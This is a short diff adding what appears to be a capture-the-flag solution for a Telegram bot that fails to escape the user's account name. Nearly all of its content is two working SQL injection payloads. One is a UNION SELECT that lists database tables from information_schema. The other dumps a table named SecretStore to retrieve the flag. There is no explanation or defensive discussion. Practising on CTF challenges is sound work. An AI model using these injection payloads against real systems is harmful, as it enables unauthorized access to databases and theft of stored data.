@@ -1,0 +1,6 @@
+#The bot does not escape the name of your TG account
+#Leak tables
+' UNION SELECT 1,table_name from information_schema.tables -- -
+
+#Get Flag
+' UNION SELECT *,1 from SecretStore -- -
